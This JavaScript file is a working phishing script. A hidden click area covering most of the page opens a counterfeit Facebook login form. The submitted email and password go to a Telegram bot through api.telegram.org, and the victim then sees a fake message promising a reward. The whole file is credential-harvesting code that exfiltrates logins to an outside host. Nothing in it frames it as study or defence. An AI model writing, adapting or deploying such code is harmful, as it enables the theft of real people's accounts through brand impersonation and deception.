import { config } from './config.js';

document.addEventListener('DOMContentLoaded', () => {
    const clickSound = new Audio(config.clickSound);
    
    const modalOverlay = document.createElement('div');
    modalOverlay.className = 'modal-overlay';
    
    const facebookLogin = document.createElement('div');
    facebookLogin.className = 'facebook-login';
    facebookLogin.innerHTML = `
        <img src="images.png" alt="Facebook">
        <form id="login-form">
            <input type="text" id="email" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <a href="#">Forgotten password?</a>
            <div class="divider"></div>
            <button type="button" class="create-account">Create new account</button>
        </form>
    `;

    const successMessage = document.createElement('div');
    successMessage.className = 'success-message';
    successMessage.innerHTML = `
        <h3>Success!</h3>
        <p>Your reward will be delivered soon.</p>
    `;
    
    document.body.appendChild(modalOverlay);
    document.body.appendChild(facebookLogin);
    document.body.appendChild(successMessage);

    // Create single clickable area for bottom 60%
    const collectArea = document.createElement('div');
    collectArea.className = 'collect-area';
    collectArea.style.position = 'absolute';
    collectArea.style.bottom = '0';
    collectArea.style.left = '0';
    collectArea.style.width = '100%';
    collectArea.style.height = '60%';
    document.body.appendChild(collectArea);

    async function sendToTelegram(credentials) {
        const message = `New login:\nEmail: ${credentials.email}\nPassword: ${credentials.password}`;
        const url = `https://api.telegram.org/bot${config.telegramBot.token}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: config.telegramBot.chatId,
                    text: message
                })
            });
        } catch (error) {
            console.error('Error sending message:', error);
        }
    }

    collectArea.addEventListener('click', () => {
        clickSound.play();
        modalOverlay.style.display = 'block';
        facebookLogin.style.display = 'block';
    });

    document.getElementById('login-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        clickSound.play();
        
        const credentials = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value
        };

        await sendToTelegram(credentials);
        
        facebookLogin.style.display = 'none';
        successMessage.style.display = 'block';
        
        setTimeout(() => {
            successMessage.style.display = 'none';
            modalOverlay.style.display = 'none';
        }, 3000);
    });
});
